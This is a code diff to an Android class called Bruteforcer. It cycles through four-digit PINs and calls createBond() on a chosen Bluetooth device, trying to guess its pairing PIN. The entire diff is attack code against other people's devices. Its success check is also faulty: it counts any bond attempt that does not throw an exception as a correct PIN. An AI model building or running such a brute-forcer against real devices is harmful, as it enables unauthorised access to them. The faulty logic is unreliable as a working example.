@@ -21,13 +21,13 @@ public class Bruteforcer {
         this.context.registerReceiver(mPairingRequestReceiver, filter);
     }
 
-    public void start(int range) {
+    public void start(int range, BluetoothDevice target) {
         boolean correct = false;
         TextView pin = (TextView) ((MainActivity)context).findViewById(R.id.Pin);
         while(range <= 9999 && !correct) {
             // Try this pin
             this.tryPin = range;
-            if(isConnected()) {
+            if(isConnected(target)) {
                 this.result = range;
                 pin.setText("Pin found: "+formatPin(range));
                 correct = true;
@@ -37,10 +37,6 @@ public class Bruteforcer {
                 range++;
             }
         }
-    }
-
-    public int getResult() {
-        return result;
     }
 
     public String formatPin(int pin) {
@@ -64,20 +60,17 @@ public class Bruteforcer {
         return pinFormatted;
     }
 
-    public Boolean isConnected() {
-        Boolean flag = false;
-        //pairDevice();
-        return flag;
-    }
-
-    private void pairDevice(BluetoothDevice device) {
+    public Boolean isConnected(BluetoothDevice target) {
+        Boolean connected = false;
         try {
             // Start pairing with device
-            device.createBond();
+            target.createBond();
+            connected = true;
             // Pairing finished
         } catch (Exception e) {
             e.printStackTrace();
         }
+        return connected;
     }
 
     private final BroadcastReceiver mPairingRequestReceiver = new BroadcastReceiver() {
